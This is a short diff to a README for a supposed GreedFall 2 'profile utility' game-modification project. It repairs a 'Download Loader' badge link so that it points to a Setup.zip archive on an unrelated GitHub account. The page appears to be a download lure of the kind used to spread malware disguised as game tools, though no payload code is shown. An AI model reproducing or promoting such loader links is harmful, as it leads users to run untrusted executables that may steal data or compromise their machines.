@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for GreedFall 2 Profile Utility
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)]https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,4 +38,5 @@ configs/
 `GreedFall-2-Profile-Utility` · Updated: 2026-10-25
 
 **Tags:** `greedfall-2` `profile` `utility` `rpg` `fantasy` `spiders-engine` `colonial` `early-access`
+
 
